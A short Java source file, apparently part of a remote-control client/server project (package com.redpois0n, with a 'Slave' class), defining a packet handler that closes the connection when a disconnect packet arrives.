package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;

public class Packet12Disconnect extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.closeSocket(new CloseException("Disconnect packet"));
	}

}
